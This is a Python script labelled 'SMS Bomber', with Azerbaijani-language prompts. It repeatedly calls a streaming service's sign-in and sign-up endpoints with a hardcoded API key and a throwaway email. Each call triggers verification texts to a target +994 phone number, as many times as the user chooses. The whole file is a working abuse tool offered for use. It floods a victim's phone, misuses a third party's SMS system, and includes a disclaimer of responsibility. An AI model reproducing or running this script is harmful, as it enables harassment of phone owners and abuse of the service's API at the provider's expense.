#!/usr/bin/env python3



import requests as rq

import colorama

from colorama import Fore, Back, Style

"""

SMS Bomber



with :) Deniz

"""



def send(target):

  header = {

    "x-api-key": "dtGKRIAd7y3mwmuXGk63u3MI3Azl1iYX8w9kaeg3"

  }



  data = {

    "requestType":"send",

    "phoneNumber":"+994"+target,

    "screenName":"signin"

  }



  url = "https://prod-api.viewlift.com/identity/signin?site=hoichoitv&deviceId=browser-44067eab-5337-99d8-11eb-99ca1e4db186"

  res = rq.post(url, json=data, headers=header)

  if res.json().get("code"):

    data = {

      "requestType":"send",

      "phoneNumber":"+994"+target,

      "emailConsent":"true",

      "whatsappConsent":"true",

      "email":"cicas94417@iconmle.com"

    }

    url = "https://prod-api.viewlift.com/identity/signup?site=hoichoitv"



    res = rq.post(url, json=data, headers=header)

    if not res.json().get("sent"): return False

  return True

  

print(Fore.RED)

print("""



                                                                                                                                               

                                                                                                                                                                       with :) Deniz                            

                                                                                                                                                                                                   
    Qeyd : Biz Heç bir şeydən məsuliyyət daşımırıq.

""")

print(Fore.MAGENTA + " <3 ")

print(Style.RESET_ALL)



def main():

  

  target = input("[*] Nömrəni (+994) Olmadan Yaz! (0 Yazmırıq Məs:551234567): ")

  amount = int(input("[*] Göndəriləcək SMS sayı: "))

  sent, nsent = 0, amount

  for i in range(1, amount + 1):

    try:

      if send(target):

        print(f"[ID: {i}] SMS Uğurla Göndərildi!")

        sent += 1

        nsent -= 1

      else:

        print(f"[ID: {i}] SMS göndərmək alınmadı...(Yəqin ki, blok etdi)")

    except KeyboardInterrupt: break

    except Exception as e: print(e); break

  print(f"\n[*] Ümumi Göndərilən: {amount}\n[+] Göndərilən: {sent}\n[-] Alınmayan: {nsent}")



if __name__ == "__main__":

  main()
